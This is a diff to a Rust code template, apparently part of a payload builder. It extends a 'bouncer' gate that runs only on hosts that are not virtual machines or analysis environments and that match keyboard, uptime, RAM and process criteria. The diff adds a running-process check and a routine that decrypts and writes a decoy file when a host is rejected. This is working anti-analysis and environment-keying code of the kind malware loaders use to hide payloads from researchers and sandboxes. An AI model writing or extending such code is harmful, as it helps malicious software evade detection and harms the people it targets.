@@ -20,6 +20,10 @@ use windows::Win32::UI::Input::KeyboardAndMouse::{
 const MODE_ALL: bool = $MODE_ALL$;
 /// Whether a rejected host exits with code 1 (`true`) or silently (`false`).
 const ON_FAIL_EXIT: bool = $ON_FAIL_EXIT$;
+/// Whether a rejected host writes the configured decoy before exiting.
+const ON_FAIL_DECOY: bool = $ON_FAIL_DECOY$;
+/// Whether the decoy drop exits with code 1 (`true`) or silently (`false`).
+const AFTER_EXIT: bool = $AFTER_EXIT$;
 /// Whether the host must not be a hypervisor guest.
 const REQUIRE_NOT_VM: bool = $REQUIRE_NOT_VM$;
 /// Whether the host must not look like an analysis environment.
@@ -54,6 +58,7 @@ pub fn bouncer() -> Result<bool, String> {
     let env_processes: Vec<String> = $ANALYSIS_PROCESSES_DEF$;
     let env_tokens: Vec<String> = $ANALYSIS_PATH_TOKENS_DEF$;
     let vendor_tokens: Vec<String> = $VENDOR_TOKENS_DEF$;
+    let processes: Vec<(String, bool)> = $PROCESS_DEFS$;
     let min_uptime: Option<u32> = $MIN_UPTIME_DEF$;
     let min_ram: Option<u32> = $MIN_RAM_DEF$;
 
@@ -111,6 +116,28 @@ pub fn bouncer() -> Result<bool, String> {
                 .any(|accepted| normalize_klid(accepted) == *layout)
         });
         crate::tech_dbg!("bouncer", "keyboard {active:?} in {keyboards:?} -> {ok}");
+        if ok {
+            passed += 1;
+        }
+    }
+
+    // The `processes` list is one check: it passes only when every entry holds.
+    // A `(name, true)` entry requires the process to be running; `(name, false)`
+    // requires it to be absent.
+    if !processes.is_empty() {
+        declared += 1;
+        let running = running_processes()?;
+        let ok = processes.iter().all(|(pattern, require_present)| {
+            let present = running.iter().any(|name| {
+                let stem = match name.strip_suffix(".exe") {
+                    Some(stem) => stem,
+                    None => name.as_str(),
+                };
+                glob_match(pattern, name) || glob_match(pattern, stem)
+            });
+            present == *require_present
+        });
+        crate::tech_dbg!("bouncer", "processes {} -> {ok}", processes.len());
         if ok {
             passed += 1;
         }
@@ -176,10 +203,18 @@ pub fn bouncer() -> Result<bool, String> {
         crate::tech_dbg!("bouncer", "host accepted");
         return Ok(true);
     }
-    crate::tech_dbg!("bouncer", "host rejected (exit on fail: {ON_FAIL_EXIT})");
+    crate::tech_dbg!("bouncer", "host rejected");
 
-    // Rejected. `exit` leaves an explicit signal; `silent` lets the template
-    // exit with code 0 and no reason behind it.
+    // Rejected. `decoy` writes the embedded asset first; `exit` leaves an
+    // explicit signal; `silent` lets the template exit with code 0 and no reason
+    // behind it.
+    if ON_FAIL_DECOY {
+        drop_decoy()?;
+        if AFTER_EXIT {
+            std::process::exit(1);
+        }
+        return Ok(false);
+    }
     if ON_FAIL_EXIT {
         std::process::exit(1);
     }
@@ -499,4 +534,45 @@ fn total_ram_mb() -> Result<u64, String> {
 /// System uptime in minutes (`GetTickCount64`).
 fn uptime_minutes() -> u64 {
     (unsafe { GetTickCount64() }) / 60_000
+}
+
+/// Collects every running process's file name, lowercased (`Toolhelp32`).
+fn running_processes() -> Result<Vec<String>, String> {
+    let snapshot = match unsafe { CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0) } {
+        Ok(handle) => handle,
+        Err(error) => return Err(win32_error($MSG_PROCESS_ENUM_FAILED$, error.code().0 as u32)),
+    };
+
+    let mut entry = PROCESSENTRY32W {
+        dwSize: core::mem::size_of::<PROCESSENTRY32W>() as u32,
+        ..Default::default()
+    };
+
+    let mut names = Vec::new();
+    if unsafe { Process32FirstW(snapshot, &mut entry) }.is_ok() {
+        loop {
+            names.push(wide_to_string(&entry.szExeFile).to_ascii_lowercase());
+            if unsafe { Process32NextW(snapshot, &mut entry) }.is_err() {
+                break;
+            }
+        }
+    }
+
+    let _ = unsafe { CloseHandle(snapshot) };
+    Ok(names)
+}
+
+/// Writes the configured decoy to disk (decrypting the embedded asset).
+///
+/// A no-op when no path is declared, so the no-op gate never touches the disk.
+fn drop_decoy() -> Result<(), String> {
+    let path: Option<String> = $DECOY_PATH_DEF$;
+    let path = match path {
+        Some(path) => crate::expand_env(&path),
+        None => return Ok(()),
+    };
+    let bytes = asset_bytes()?;
+    std::fs::write(&path, &bytes).map_err(|_| $MSG_DECOY_WRITE_FAILED$)?;
+    crate::tech_dbg!("bouncer", "decoy written");
+    Ok(())
 }
